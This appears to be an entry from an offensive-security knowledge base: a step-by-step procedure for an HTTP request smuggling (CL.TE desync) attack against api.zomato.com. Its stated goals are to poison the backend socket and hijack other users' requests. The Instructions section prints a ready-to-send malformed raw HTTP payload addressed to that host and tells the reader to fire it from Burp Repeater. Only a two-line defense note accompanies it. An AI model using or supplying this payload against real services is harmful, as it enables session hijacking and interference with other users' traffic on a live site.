---
tags:
  - http-smuggling
  - socket-poisoning
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/http-smuggling-payload-to-hijack]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 08fdb350-b37b-412d-94e7-9905249faf6f
created_at: '2025-12-13T09:01:26.170Z'
updated_at: '2025-12-13T09:01:26.170Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft HTTP Smuggling Payload to Poison Socket

## Summary

This procedure crafts a specific HTTP request smuggling payload to exploit CL.TE desync, poisoning the backend socket and allowing hijacking of subsequent victim requests on api.zomato.com.

## Description

By combining Content-Length and malformed Transfer-Encoding headers, the payload causes the frontend to process a short request while the backend awaits chunked data, prepending attacker-controlled content to the next request in the socket queue. This sets up for session hijacking.

## Requirements

1. Burp Suite for crafting and sending requests
2. Target host: api.zomato.com
3. Knowledge of vulnerable payload variant (tabprefix1)

## Defense

Defensive measures and detection strategies:

- Enforce consistent HTTP parsing across all servers
- Use connection pooling with validation to prevent poisoning

## Objectives

1. Poison backend socket
2. Hijack victim requests
3. Enable data injection

## Instructions

### Step 1: Craft and Send Payload

**Context**: Create request to cause desync and poison socket.

**Command** ([[commands/http-smuggling-payload-to-hijack]]):
```http
DELETE / HTTP/1.1
Transfer-Encoding: chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7
0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```

> Use Burp Repeater to send; verify desync by observing altered victim responses.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/http-smuggling-payload-to-hijack]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[http-smuggling]]
- [[socket-poisoning]]
